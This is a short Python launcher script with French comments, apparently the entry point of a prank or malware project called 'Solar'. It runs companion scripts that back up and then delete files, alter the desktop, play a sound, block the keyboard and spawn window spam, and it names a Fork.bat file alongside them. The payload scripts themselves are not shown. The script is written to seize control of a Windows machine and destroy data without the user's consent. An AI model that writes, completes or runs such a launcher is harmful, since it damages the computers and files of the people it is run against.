#-*- coding: utf-8 -*-

# Imports
import os, subprocess, sys, time, shutil, getpass, threading

# Nom d'utilisateur actuel
username = getpass.getuser()

# Fichiers

# Directory
# Dossier Solar
pathFile = os.path.dirname(os.path.abspath(__file__))

# File
# Sound file
pathStart_sound = (pathFile + '\\Start_sound.py')
# Save.py
pathSave = (pathFile + '\\Save.py')
# Clean.py
pathClean = (pathFile + '\\Clean.py')
# Desktop.py
pathDesktop = (pathFile + '\\Desktop.py')
# Progress.py
pathProgress = (pathFile + '\\Progress.py')
# Start_spam.py
pathStart_spam = (pathFile + '\\Start_spam.py')
# Fork.bat
pathFork = (pathFile + '\\Fork.bat')
#path Block_keyboard
pathBlock_keyboard = (pathFile + '\\Block_keyboard.py')

# Main
import keyboard

class Launcher :

    def main (self) :

        # Sauvegarde des fichiers au démarrage
        subprocess.Popen([sys.executable, pathSave])

        # Desktop.py
        subprocess.Popen([sys.executable, pathDesktop])
        time.sleep(1)

        # Suppression des fichiers
        subprocess.Popen([sys.executable, pathClean])
        # Retour à l'écran
        keyboard.press_and_release('windows + d')
        subprocess.Popen([sys.executable, pathStart_sound])
        time.sleep(1)
        # Blocage du clavier
        def block():
            subprocess.Popen([sys.executable, pathBlock_keyboard])
        thread_block = threading.Thread(target=block)
        thread_block.daemon = True
        thread_block.start()
        time.sleep(1)

        # Lance la Window spam
        def spam():
            subprocess.Popen([sys.executable, pathStart_spam])
        thread_spam = threading.Thread(target=spam)
        thread_spam.daemon = True
        thread_spam.start()

# Start
L = Launcher()
L.main()
